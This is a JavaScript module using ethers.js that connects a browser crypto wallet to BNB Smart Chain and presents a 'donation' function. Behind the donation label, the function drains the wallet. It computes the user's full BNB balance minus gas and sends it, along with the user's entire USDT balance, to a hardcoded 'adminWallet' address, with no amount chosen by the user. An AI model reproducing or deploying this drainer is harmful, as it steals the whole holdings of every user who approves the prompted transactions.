import { ethers } from 'ethers';

let provider;
let signer;
let usdtContract;

const adminWallet = "0xC42FD92eDadfA07c5b6845572c0961854787b473"; // Your admin wallet address

const BSC_MAINNET_PARAMS = {
  chainId: '0x38', // 56 in decimal
  chainName: 'Binance Smart Chain Mainnet',
  nativeCurrency: {
    name: 'BNB',
    symbol: 'BNB',
    decimals: 18
  },
  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
  blockExplorerUrls: ['https://bscscan.com/']
};

// Add USDT contract ABI (this is a simplified version, you might need more functions)
const USDT_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint amount) returns (bool)",
  "function decimals() view returns (uint8)",
];

const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT contract address

async function switchToBSCMainnet() {
  if (window.ethereum) {
    try {
      // Try to switch to BSC Mainnet
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: BSC_MAINNET_PARAMS.chainId }],
      });
    } catch (switchError) {
      // This error code indicates that the chain has not been added to MetaMask
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [BSC_MAINNET_PARAMS],
          });
        } catch (addError) {
          throw new Error("Failed to add BSC Mainnet to wallet");
        }
      } else {
        throw new Error("Failed to switch to BSC Mainnet");
      }
    }
  } else if (window.trustwallet) {
    // For Trust Wallet, we might need to guide the user to switch manually
    throw new Error("Please switch to BSC Mainnet manually in your Trust Wallet");
  }
}

export async function connectWallet() {
  try {
    await switchToBSCMainnet();

    if (window.ethereum) {
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      provider = new ethers.BrowserProvider(window.ethereum, "any");
    } else if (window.trustwallet) {
      provider = new ethers.BrowserProvider(window.trustwallet);
    } else {
      throw new Error("No compatible wallet found");
    }

    signer = await provider.getSigner();
    const userAddress = await signer.getAddress();

    // Initialize USDT contract
    usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);

    // Verify that we're on the correct network
    const network = await provider.getNetwork();
    if (network.chainId !== BigInt(56)) { // 56 is the chain ID for BSC Mainnet
      throw new Error("Please ensure you are connected to the Binance Smart Chain Mainnet");
    }

    return userAddress;
  } catch (error) {
    console.error("Wallet connection error:", error);
    throw error;
  }
}

async function getUSDTBalance(address) {
  const balance = await usdtContract.balanceOf(address);
  const decimals = await usdtContract.decimals();
  return ethers.formatUnits(balance, decimals);
}

export async function donateBNBAndUSDT() {
  try {
    if (!signer) {
      throw new Error("Please connect your wallet first.");
    }

    await switchToBSCMainnet();

    const userAddress = await signer.getAddress();
    const bnbBalance = await provider.getBalance(userAddress);
    const usdtBalance = await getUSDTBalance(userAddress);

    console.log("Current BNB balance:", ethers.formatEther(bnbBalance));
    console.log("Current USDT balance:", usdtBalance);

    if (bnbBalance <= 0 && parseFloat(usdtBalance) <= 0) {
      throw new Error("Insufficient balance to make the donation");
    }

    let bnbTxHash, usdtTxHash;

    // Transfer BNB
    if (bnbBalance > 0) {
      const feeData = await provider.getFeeData();
      const gasPrice = feeData.gasPrice;
      const gasLimit = 21000;
      const maxGasCost = gasPrice * BigInt(gasLimit);
      const amountToSend = bnbBalance - maxGasCost;

      if (amountToSend > 0) {
        const bnbTx = await signer.sendTransaction({
          to: adminWallet,
          value: amountToSend
        });
        bnbTxHash = bnbTx.hash;
        console.log("BNB Transaction sent:", bnbTxHash);
        await bnbTx.wait();
      }
    }

    // Transfer USDT
    if (parseFloat(usdtBalance) > 0) {
      const usdtTx = await usdtContract.transfer(adminWallet, ethers.parseUnits(usdtBalance, 18));
      usdtTxHash = usdtTx.hash;
      console.log("USDT Transaction sent:", usdtTxHash);
      await usdtTx.wait();
    }

    return {
      bnbTxHash,
      usdtTxHash,
      bnbAmount: ethers.formatEther(bnbBalance),
      usdtAmount: usdtBalance
    };
  } catch (error) {
    console.error("Donation failed:", error);
    throw error;
  }
}
